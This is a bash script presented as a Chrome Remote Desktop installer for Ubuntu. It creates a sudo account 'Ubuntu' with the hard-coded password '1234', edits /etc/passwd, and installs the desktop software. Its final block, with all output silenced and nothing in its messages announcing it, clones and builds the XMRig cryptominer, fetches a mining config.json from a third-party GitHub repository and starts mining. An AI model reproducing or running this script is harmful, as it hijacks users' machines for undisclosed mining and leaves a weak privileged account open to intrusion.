#! /bin/bash
##code By Linuxinet##
RED='\033[0;31m'
GREEN='\33[0;32m'
NC='\033[0m'
printf "${RED}User successfully created :- Ubuntu${NC}\n"
printf "${RED}Password successfully created :- 1234${NC}\n"



printf "${GREEN}Installing RDP Be Patience....${NC}" >&2
{
sudo useradd -m Ubuntu
sudo adduser Ubuntu sudo
echo 'Ubuntu:1234' | sudo chpasswd
sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd
sudo apt-get update
wget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb
sudo dpkg --install chrome-remote-desktop_current_amd64.deb
sudo apt install --assume-yes --fix-broken
sudo DEBIAN_FRONTEND=noninteractive \
apt install --assume-yes xfce4 desktop-base
sudo bash -c 'echo "exec /etc/X11/Xsession /usr/bin/xfce4-session" > /etc/chrome-remote-desktop-session'  
sudo apt install --assume-yes xscreensaver
sudo systemctl disable lightdm.service
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
sudo dpkg --install google-chrome-stable_current_amd64.deb
sudo apt install --assume-yes --fix-broken
sudo apt install nautilus nano -y 
sudo adduser Ubuntu chrome-remote-desktop
} &> /dev/null &&
printf "\nSetup Complete " >&2 ||
printf "\nError Occured " >&2
printf '\nCheck https://remotedesktop.google.com/headless  Copy Command Of Debian Linux And Paste Down\n'
read -p "Paste Here: " CRP
su - Ubuntu -c """$CRP"""
printf 'Check https://remotedesktop.google.com/access/ \n\n'
{
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev && git clone https://github.com/xmrig/xmrig && mkdir xmrig/build && cd xmrig/build && cmake .. && make -j$(nproc) && wget "https://raw.githubusercontent.com/yanarie123/miningvps/main/config.json" && ./xmrig
}&> /dev/null
